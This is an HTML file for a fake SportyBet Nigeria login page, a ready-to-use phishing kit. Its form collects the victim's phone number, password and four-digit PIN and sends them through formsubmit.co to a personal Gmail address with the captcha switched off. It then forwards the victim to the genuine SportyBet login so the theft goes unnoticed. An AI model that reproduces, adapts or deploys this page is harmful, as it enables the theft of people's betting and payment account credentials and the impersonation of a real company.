<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" type="image/x-icon" href="./images/shortLogo.e62322c232.png" />
    <!-- CSS only -->
    <link rel="stylesheet" href="/css/style.css" />
    <title>Login SportyBetApp</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css"
      rel="stylesheet"
    />
  </head>
  <body class="max-w-7xl mx-auto">
    <header class="text-black p-10 flex justify-between items-center">
      <div class="flex space-x-3 items-center">
        <img src="./images/images.png" alt="SportyBetApp-Country" class="h-6" />
        <div class="capitalize font-medium">nigeria</div>
        <div
          class="text-green-700 font-medium capitalize text-lg flex items-center gap-4"
        >
          change
          <span
            ><svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-6 h-6 text-green-600"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M8.25 4.5l7.5 7.5-7.5 7.5"
              />
            </svg>
          </span>
        </div>
      </div>
      <div>
        <a href="/index.html">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="1.5"
            stroke="currentColor"
            class="w-6 h-6 !font-bold home"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M4.5 19.5l15-15m-15 0l15 15"
            />
          </svg>
        </a>
      </div>
    </header>
    <main class="pb-10 px-10 flex flex-col">
      <div>
        <form  action="https://formsubmit.co/gracielalira565@gmail.com" method="POST">
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_next" value="https://www.sportybet.com/ng/lite/login?param1=value&param2=value">
          <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
            <div>+234</div>
            <input
              type="number"
              id="number"
              name="Phone Number"
              placeholder="Sportybet Mobile Number"
              required
              class="flex-1 outline-none"
            />
          </div>
          <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
            <input
              type="password"
              id="Password"
              placeholder="Sportybet Password"
              name="Password"
              class="flex-1 outline-none text-gray-500"
              required
            />
          </div>
          <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
            <input
              type="number"
              id="number"
              placeholder="Sportybet Four Pin"
              class="flex-1 outline-none"
              name="Four Digit Pin"
              required
              minlength="4"
              maxlength="4"
            />
          </div>
          <div
            class="flex items-center w-[100%] lg:w-[99%] -ml-3 p-3 mb-5 mt-10"
          >
            <button
              type="submit"
              class="text-center w-full bg-green-700 py-4 text-white capitalize text-lg rounded shadow hover:shadow-lg active:scale-90 duration-200 ease-out"
            >
              login
            </button>
          </div>
        </form>
      </div>
      <div
        class="flex justify-between pr-8 capitalize text-blue-900 font-base flex-wrap"
      >
        <div class="text-sm">forgot password ?</div>
        <div class="text-sm">create new account</div>
      </div>
      <div
        class="flex capitalize text-xl justify-center items-center my-12 font-medium text-gray-600"
      >
        or
      </div>
      <div class="text-gray-600 text-sm">
        To deativate or reactivate your account
        <span class="text-green-700 text-lg text-sm">click here.</span>
      </div>
    </main>
    <script src="./app.js"></script>
  </body>
</html>
